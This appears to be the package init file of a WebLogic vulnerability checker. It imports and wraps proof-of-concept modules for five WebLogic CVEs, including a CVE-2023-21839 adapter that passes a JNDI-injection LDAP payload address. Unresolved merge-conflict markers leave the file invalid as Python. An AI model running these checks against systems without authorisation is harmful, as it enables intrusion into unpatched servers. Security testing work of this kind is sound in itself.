from .cve_2020_2551_poc import poc as cve_2020_2551_poc
from .cve_2018_2628_poc import poc as cve_2018_2628_poc
from .cve_2018_2894_poc import poc as cve_2018_2894_poc

<<<<<<< HEAD
# 新增 POC 适配器
def cve_2020_14756_poc(url, timeout=10):
    """
    WebLogic CVE-2020-14756 POC 适配器
    """
    try:
        from .CVE_2020_14756 import TestPOC
        from urllib.parse import urlparse
        
        poc = TestPOC()
        poc.url = url
        
        result = poc._verify()
        
        if result and hasattr(result, 'success'):
            return True, "Vulnerable"
        return False, "Not Vulnerable"
    except Exception as e:
        return False, str(e)

def cve_2023_21839_poc(url, timeout=10):
    """
    WebLogic CVE-2023-21839 POC 适配器
    """
    try:
        from .CVE_2023_21839 import POC
        from urllib.parse import urlparse
        
        parsed = urlparse(url)
        target = parsed.hostname
        port = parsed.port or 7001
        ldap = "ldap://127.0.0.1:1389/exp"
        
        poc = POC(target, port, ldap)
        poc.verify()
        
        return True, "Vulnerable"
    except Exception as e:
        return False, str(e)

__all__ = [
    'cve_2020_2551_poc',
    'cve_2018_2628_poc',
    'cve_2018_2894_poc',
    'cve_2020_14756_poc',
    'cve_2023_21839_poc'
]
=======
__all__ = ['cve_2020_2551_poc', 'cve_2018_2628_poc', 'cve_2018_2894_poc']
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
